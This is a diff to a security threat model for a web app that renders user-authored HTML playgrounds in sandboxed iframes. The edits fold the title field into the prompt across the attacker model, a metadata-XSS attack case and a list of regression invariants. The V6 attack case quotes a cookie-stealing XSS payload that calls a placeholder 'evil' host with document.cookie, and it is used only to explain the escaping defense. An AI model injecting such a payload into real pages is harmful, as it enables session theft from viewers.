@@ -19,7 +19,7 @@ the app UI a viewer sees, and the commons data.
 
 **Attacker.** Any author of a playground. Generation turns an arbitrary description into an
 arbitrary self-contained HTML file, and the commons is public by default, so **the playground
-HTML, its prompt, its title, its author string, and its tags are all attacker-controlled
+HTML, its prompt (which is also the displayed title), its author string, and its tags are all attacker-controlled
 text**. The store makes *no* safety claim about the bytes. The attacker's goal is to run code
 that reaches off the playground and touches the asset — steal the session, act as the viewer,
 deface the app, or exfiltrate.
@@ -105,12 +105,12 @@ where they land in an opaque frame. **Result: fails.**
 **Test:** `never serves raw playground bytes on the app origin`.
 
 ### V6 — XSS the trusted chrome via playground metadata
-**Attempt:** Author a playground whose **prompt/title/author/tag** is
+**Attempt:** Author a playground whose **prompt/author/tag** is
 `"><img src=x onerror="fetch('https://evil?c='+document.cookie)">`. When the player or commons
 renders it, the payload executes *on the app origin*, outside the iframe — bypassing the entire
 sandbox.
 **Defense — two containments, by field:**
-- **Free text (prompt, title, author):** every outside value crossing into app-origin HTML
+- **Free text (prompt, author):** every outside value crossing into app-origin HTML
   passes the single server-side `escapeHtml` enforcer (element + quoted-attribute safe:
   `& < > " '`); the client homepage renders untrusted prompt/author via `textContent`, not
   `innerHTML`. The payload renders as inert text.
@@ -167,7 +167,7 @@ The invariants a future change must not silently regress (each has a red test):
 1. The player iframe stays `allow-scripts` **without** `allow-same-origin` or any
    `allow-top-navigation*`. Adding either collapses L2.
 2. The content CSP keeps `default-src 'none'` and `connect-src 'none'`.
-3. Free-text metadata (prompt/title/author) stays escaped at every app-origin callsite, and
+3. Free-text metadata (prompt/author) stays escaped at every app-origin callsite, and
    tags stay minted through the `Tag()` brand rather than stored raw (V6).
 4. The session cookie stays `HttpOnly` + `SameSite=Strict` + `Secure` + `__Host-`.
 5. The content host serves nothing but `contentHandler`; raw bytes never appear on the app host.
